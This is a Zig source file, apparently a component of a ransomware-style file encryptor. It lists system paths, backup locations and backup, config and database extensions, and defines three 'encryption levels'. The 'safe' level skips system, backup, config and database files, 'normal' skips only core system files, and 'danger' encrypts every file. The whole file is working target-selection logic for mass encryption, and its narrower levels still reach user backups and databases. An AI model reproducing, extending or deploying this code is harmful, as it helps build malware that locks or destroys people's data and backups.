const std = @import("std");

const SYSTEM_PATHS: []const []const u8 = &.{
    // Linux
    "/bin/bash",
    "/bin/ls",
    "/etc/fstab",
    "/etc/passwd",
    "/lib/libc.so.6",
    // macOS
    "/System/Library/CoreServices",
    "/usr/lib/libSystem.B.dylib",
    // Windows
    "C:\\Windows\\System32\\kernel32.dll",
    "C:\\Windows\\System32\\user32.dll",
    "C:\\Windows\\System32\\ntdll.dll",
};
const BACKUP_PATHS: []const []const u8 = &.{
    // Linux
    "/var/backups",
    // macOS
    "/Volumes/Time Machine Backups/",
    // Windows
    "C:\\Windows\\System32\\Backup\\Backup.bkf",
    "\\System Volume Information\\",
};

const BACKUP_EXTENSIONS: []const []const u8 = &.{
    ".backup",
    ".bak",
    ".dmp",
    ".dump",
    ".old",
};
const CONFIG_EXTENSIONS: []const []const u8 = &.{
    ".cfg",
    ".cnf",
    ".conf",
};
const DATABASE_EXTENSIONS: []const []const u8 = &.{
    // Common
    ".db",
    ".db3",
    ".dbs",
    ".sql",
    // MSSQL
    ".mdf",
    ".ndf",
    // MySQL
    ".frm",
    ".myd",
    ".myi",
    ".ibd",
    ".ibdata1",
    // PostgreSQL
    ".pgpass",
    // SQLite
    ".sqlite",
    ".sqlite2",
    ".sqlite3",
};

// The encryption level. The higher the level, the more files will be encrypted.
pub const Level = enum {
    safe,
    normal,
    danger,

    const Self = @This();

    pub fn init(level_num: usize) !Self {
        switch (level_num) {
            1 => return .safe,
            2 => return .normal,
            3 => return .danger,
            else => return error.InvalidLevel,
        }
    }

    pub fn shouldEncrypt(self: Self, path: []const u8) bool {
        switch (self) {
            .safe => {
                // std.debug.print("path: {s}\n", .{path});
                for (SYSTEM_PATHS) |sp| {
                    if (std.mem.containsAtLeast(u8, path, 1, sp)) return false;
                }
                for (BACKUP_PATHS) |bp| {
                    if (std.mem.containsAtLeast(u8, path, 1, bp)) return false;
                }
                for (BACKUP_EXTENSIONS) |be| {
                    if (std.mem.containsAtLeast(u8, path, 1, be)) return false;
                }
                for (CONFIG_EXTENSIONS) |ce| {
                    if (std.mem.containsAtLeast(u8, path, 1, ce)) return false;
                }
                for (DATABASE_EXTENSIONS) |de| {
                    if (std.mem.containsAtLeast(u8, path, 1, de)) return false;
                }
                return true;
            },
            .normal => {
                for (SYSTEM_PATHS) |sp| {
                    if (std.mem.containsAtLeast(u8, path, 1, sp)) return false;
                }
                return true;
            },
            .danger => return true, // All files are encrypted!
        }
    }
};
